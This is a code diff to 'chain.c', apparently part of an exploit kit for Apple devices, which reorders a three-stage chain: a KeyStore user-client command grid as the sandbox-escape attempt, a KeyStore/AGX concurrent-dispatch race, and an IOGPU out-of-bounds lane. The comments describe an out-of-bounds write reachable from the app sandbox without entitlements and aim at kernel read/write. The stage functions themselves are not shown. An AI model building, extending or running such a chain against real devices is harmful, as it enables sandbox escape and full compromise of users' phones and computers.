@@ -1,10 +1,7 @@
-/* chain.c — dj's order, one button:
-   stage 1 = ESCAPE PIECE: IOGPUFamily OOB probe (the kernel-corruption
-             candidate reachable from the app sandbox; hit = writes past
-             arrayC bounds via [obj+40] capacity, no entitlements needed)
-   stage 2 = GONKA: KeyStore/AGX concurrent dispatch race
-   stage 3 = OOB RW: IOGPUFamily OOB again, deep pass.
-   Chain stops on stage 1 death; each stage logs an explicit done line. */
+/* chain.c — dj's order: (1) escape attempt = KeyStore UC s17/s35
+   struct-wire command-id grid (the live non-entitlement door); (2) race
+   lanes (KeyStore/GLM-AGX concurrent dispatch); (3) IOGPU OOB fast lane
+   (AGXAcceleratorG14P). Continuous chain log (reopen after sub-stages). */
 #include <stdio.h>
 #include <stdint.h>
 #include <unistd.h>
@@ -12,17 +9,18 @@
 
 void nk_chain_run(void) {
     nk_filelog_open("chain");
-    nk_log("[esc] stage 1: IOGPU OOB (pivot out of sandbox)");
-    nk_iogpu_oob_run();
-    nk_filelog_reopen_last();
+    nk_log("[esc] stage 1: escape attempt — KeyStore s17/s35 command grid");
+    nk_ksmagic_run();
+    nk_filelog_reopen_kind("chain");
     nk_log("[esc] stage 1 done -> stage 2: race");
     fflush(stdout);
     nk_racer_run();
-    nk_filelog_reopen_last();
-    nk_log("[run] stage 2 done -> stage 3: IOGPU OOB deep");
+    nk_filelog_reopen_kind("chain");
+    nk_log("[gen] stage 2 done -> stage 3: IOGPU OOB");
     fflush(stdout);
     sleep(3);
     nk_iogpu_oob_run();
-    nk_log("[run] stage 3 done -> rw");
+    nk_filelog_reopen_kind("chain");
+    nk_log("[gen] stage 3 done -> chain end");
     nk_filelog_close();
 }
